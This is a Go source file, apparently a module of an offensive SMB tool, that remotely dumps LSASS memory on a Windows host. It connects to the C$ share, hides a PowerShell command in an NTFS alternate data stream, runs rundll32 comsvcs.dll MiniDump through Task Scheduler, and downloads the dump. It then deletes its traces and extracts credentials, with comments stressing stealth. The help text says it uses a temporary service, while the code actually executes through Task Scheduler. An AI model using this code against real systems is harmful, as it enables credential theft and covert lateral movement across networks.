package main

import (
	"context"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/ineffectivecoder/SMBGooser/pkg/minidump"
	"github.com/ineffectivecoder/SMBGooser/pkg/smb"
	"github.com/ineffectivecoder/SMBGooser/pkg/smb/types"
	"github.com/ineffectivecoder/SMBGooser/pkg/svcctl"
	"github.com/ineffectivecoder/SMBGooser/pkg/tsch"
)

func init() {
	commands.Register(&Command{
		Name:        "lsadump",
		Aliases:     []string{"lsass", "minidump"},
		Description: "Dump LSASS memory via comsvcs.dll (using svcctl service)",
		Usage:       "lsadump [-o output.dmp] [-a (use ADS)]",
		Handler:     cmdLsaDump,
	})
}

// cmdLsaDump dumps LSASS memory using comsvcs.dll via Service Control Manager
// Uses a temporary one-time service (stealthier than Task Scheduler)
// Optionally uses NTFS Alternate Data Streams for extra stealth
func cmdLsaDump(ctx context.Context, args []string) error {
	if client == nil || session == nil {
		return fmt.Errorf("not connected")
	}

	// Parse arguments
	outputFile := fmt.Sprintf("lsass_%s_%d.dmp", targetHost, time.Now().Unix())
	useADS := false

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "-o", "--output":
			if i+1 < len(args) {
				outputFile = args[i+1]
				i++
			}
		case "-a", "--ads":
			useADS = true
		case "-h", "--help":
			printLsaDumpHelp()
			return nil
		}
	}

	if useADS {
		info_("LSASS Dump via comsvcs.dll (svcctl + ADS stealth)")
	} else {
		info_("LSASS Dump via comsvcs.dll (svcctl service)")
	}
	info_("Output will be saved to: %s", outputFile)

	// Connect to C$ for file operations
	info_("Connecting to C$ for file operations...")
	cTree, err := client.TreeConnect(ctx, "C$")
	if err != nil {
		return fmt.Errorf("failed to connect to C$: %w", err)
	}
	defer client.TreeDisconnect(ctx, cTree)

	// Setup credentials for tsch (we know this works from ishell)
	tschCreds := tsch.Credentials{
		Username: currentUser,
		Password: currentPassword,
		Hash:     currentHash,
		Domain:   currentDomain,
	}

	// Create tsch client for command execution (proven to work)
	tschClient, err := tsch.NewClient(ctx, client, tschCreds)
	if err != nil {
		return fmt.Errorf("failed to create task scheduler client: %w", err)
	}
	defer tschClient.Close()

	// Create svcctl client (not used for execution but kept for future)
	svcClient, err := svcctl.NewClient(ctx, client)
	if err != nil {
		return fmt.Errorf("failed to create svcctl client: %w", err)
	}
	defer svcClient.Close()

	// Open Service Control Manager
	if err := svcClient.OpenSCManager("", svcctl.SCManagerAllAccess); err != nil {
		return fmt.Errorf("failed to open SCM: %w", err)
	}

	// Create base file for ADS command execution (like ishell)
	// This is used internally for stealth command execution, not shown to user
	adsBase := fmt.Sprintf("Windows\\Temp\\svc%d.log", time.Now().UnixNano()%1000000)
	adsCmd := adsBase + ":c" // Command stream

	if err := createEmptyFileLsa(ctx, cTree, adsBase); err != nil {
		return fmt.Errorf("failed to create ADS base file: %w", err)
	}
	defer cleanupFileLsa(ctx, cTree, adsBase)

	// Prepare dump path
	var dumpPath string
	var dumpBaseFile string

	if useADS {
		// Dump to ADS for extra stealth
		dumpBaseFile = fmt.Sprintf("Windows\\Temp\\s%d.log", time.Now().UnixNano()%1000000)
		dumpPath = dumpBaseFile + ":d"
		if err := createEmptyFileLsa(ctx, cTree, dumpBaseFile); err != nil {
			return fmt.Errorf("failed to create dump base file: %w", err)
		}
		defer cleanupFileLsa(ctx, cTree, dumpBaseFile)
		info_("Dump location: C:\\%s:d (ADS stealth)", dumpBaseFile)
		info_("Dumping LSASS to ADS (max stealth)...")
	} else {
		dumpPath = fmt.Sprintf("Windows\\Temp\\d%d.dmp", time.Now().UnixNano()%1000000)
		info_("Dump location: C:\\%s", dumpPath)
		info_("Dumping LSASS...")
	}

	// Build the combined PID+dump command
	// Use cmd /c wrapper for rundll32 - required for non-interactive sessions (headless Windows)
	dumpPathFull := "C:\\" + dumpPath
	// Get PID via PowerShell, then use cmd /c to run rundll32 (this works in non-interactive sessions)
	psCommand := fmt.Sprintf(`$p = (Get-Process lsass).Id; cmd /c "rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump $p %s full"`, dumpPathFull)

	// Write command to ADS (like ishell does)
	if err := writeADSFileLsa(ctx, cTree, adsCmd, []byte(psCommand)); err != nil {
		return fmt.Errorf("failed to write command to ADS: %w", err)
	}

	// Build the execution command that reads from ADS and executes (ishell pattern)
	fullPath := "C:\\" + strings.ReplaceAll(adsBase, "/", "\\")
	execCmd := fmt.Sprintf(
		`powershell.exe -NoProfile -NonInteractive -Command "$cmd = Get-Content '%s:c'; Invoke-Expression $cmd"`,
		fullPath,
	)

	// Execute via tsch (this is proven to work with ishell)
	if err := tschClient.Execute(execCmd); err != nil {
		warn_("tsch execute error (may be ok): %v", err)
	}

	// Wait for dump to complete
	info_("Waiting for dump to complete...")
	time.Sleep(8 * time.Second)

	// Step 3: Download dump file
	info_("Downloading dump file...")
	var dumpData []byte

	if useADS {
		// Read from ADS
		dumpData, err = readADSFileLarge(ctx, cTree, dumpPath)
	} else {
		dumpData, err = downloadFileLsa(ctx, cTree, dumpPath)
		// Cleanup regular dump file
		defer cTree.DeleteFile(ctx, dumpPath)
	}

	if err != nil {
		return fmt.Errorf("failed to download dump: %w", err)
	}

	if len(dumpData) == 0 {
		return fmt.Errorf("dump file is empty - may require higher privileges or dump failed")
	}

	// Step 4: Save dump locally
	info_("Saving dump locally (%d bytes)...", len(dumpData))
	if err := os.WriteFile(outputFile, dumpData, 0644); err != nil {
		return fmt.Errorf("failed to save dump: %w", err)
	}

	success_("LSASS dump saved to: %s", outputFile)

	// Step 5: Parse the dump for credentials
	info_("Parsing minidump for credentials...")
	dump, err := minidump.Parse(dumpData)
	if err != nil {
		warn_("Failed to parse minidump: %v", err)
		info_("You can still parse with pypykatz: pypykatz lsa minidump %s", outputFile)
		return nil
	}

	// Show system info
	fmt.Println()
	fmt.Printf("  %sSystem Info:%s\n", colorBold, colorReset)
	fmt.Printf("  OS Build: %s\n", dump.GetBuildVersion())
	fmt.Printf("  Modules loaded: %d\n", len(dump.Modules))

	// Find lsasrv.dll
	lsasrv := dump.FindModule("lsasrv.dll")
	if lsasrv != nil {
		fmt.Printf("  lsasrv.dll: 0x%016X (%d bytes)\n", lsasrv.BaseOfImage, lsasrv.SizeOfImage)
	}

	// Extract credentials
	if err := dump.ExtractCredentials(); err != nil {
		warn_("Credential extraction error: %v", err)
	}

	if len(dump.Credentials) > 0 {
		fmt.Println()
		fmt.Printf("  %sExtracted Credentials:%s\n", colorBold, colorReset)
		fmt.Println("  " + strings.Repeat("-", 60))

		for _, cred := range dump.Credentials {
			fmt.Printf("  %s\n", minidump.FormatCredential(cred))
		}
	} else {
		fmt.Println()
		info_("No credentials extracted via heuristic search")
		info_("For full extraction, use pypykatz:")
		fmt.Printf("  pypykatz lsa minidump %s\n", outputFile)
	}

	fmt.Println()

	return nil
}

// extractPIDFromCSV extracts PID from tasklist CSV output
// Format: "lsass.exe","592","Services","0","..."
func extractPIDFromCSV(csv string) string {
	lines := strings.Split(csv, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if strings.Contains(strings.ToLower(line), "lsass") {
			// Split by comma and get second field (PID)
			fields := strings.Split(line, ",")
			if len(fields) >= 2 {
				// Remove quotes
				pid := strings.Trim(fields[1], `"`)
				pid = strings.TrimSpace(pid)
				if isNumericLsa(pid) {
					return pid
				}
			}
		}
	}
	return ""
}

// Helper functions for lsadump

func createEmptyFileLsa(ctx context.Context, tree *smb.Tree, path string) error {
	file, err := tree.OpenFile(ctx, path, types.GenericWrite, types.FileCreate)
	if err != nil {
		file, err = tree.OpenFile(ctx, path, types.GenericWrite, types.FileOverwrite)
		if err != nil {
			return err
		}
	}
	return file.Close()
}

func cleanupFileLsa(ctx context.Context, tree *smb.Tree, path string) {
	tree.DeleteFile(ctx, path)
}

func writeBatFileLsa(ctx context.Context, tree *smb.Tree, path string, content string) error {
	file, err := tree.OpenFile(ctx, path, types.GenericWrite, types.FileCreate)
	if err != nil {
		file, err = tree.OpenFile(ctx, path, types.GenericWrite, types.FileOverwrite)
		if err != nil {
			return err
		}
	}
	defer file.Close()
	_, err = file.Write([]byte(content))
	return err
}

func writeADSFileLsa(ctx context.Context, tree *smb.Tree, adsPath string, data []byte) error {
	file, err := tree.OpenFile(ctx, adsPath, types.GenericWrite, types.FileCreate)
	if err != nil {
		file, err = tree.OpenFile(ctx, adsPath, types.GenericWrite, types.FileOverwrite)
		if err != nil {
			return err
		}
	}
	defer file.Close()
	_, err = file.Write(data)
	return err
}

func readADSFileLarge(ctx context.Context, tree *smb.Tree, adsPath string) ([]byte, error) {
	file, err := tree.OpenFile(ctx, adsPath, types.GenericRead, types.FileOpen)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	// Use larger buffer for minidumps (can be 50-200MB)
	var result []byte
	buf := make([]byte, 65536)
	for {
		n, err := file.Read(buf)
		if n > 0 {
			result = append(result, buf[:n]...)
		}
		if err != nil {
			break
		}
	}
	return result, nil
}

func downloadFileLsa(ctx context.Context, tree *smb.Tree, path string) ([]byte, error) {
	file, err := tree.OpenFile(ctx, path, types.GenericRead, types.FileOpen)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var result []byte
	buf := make([]byte, 65536)
	for {
		n, err := file.Read(buf)
		if n > 0 {
			result = append(result, buf[:n]...)
		}
		if err != nil {
			break
		}
	}
	return result, nil
}

// isNumericLsa checks if a string contains only digits
func isNumericLsa(s string) bool {
	if s == "" {
		return false
	}
	for _, c := range s {
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}

func printLsaDumpHelp() {
	fmt.Println("\nUsage: lsadump [-o output.dmp] [-a]")
	fmt.Println("\nDumps LSASS memory using comsvcs.dll via Service Control Manager.")
	fmt.Println("Creates a temporary one-time service (stealthier than Task Scheduler).")
	fmt.Println("\nOptions:")
	fmt.Println("  -o, --output    Output filename (default: lsass_<host>_<timestamp>.dmp)")
	fmt.Println("  -a, --ads       Write dump to NTFS Alternate Data Stream (extra stealth)")
	fmt.Println("\nParsing:")
	fmt.Println("  Native parsing is attempted automatically.")
	fmt.Println("  For full extraction, use pypykatz:")
	fmt.Println("  pypykatz lsa minidump lsass.dmp")
	fmt.Println()
}
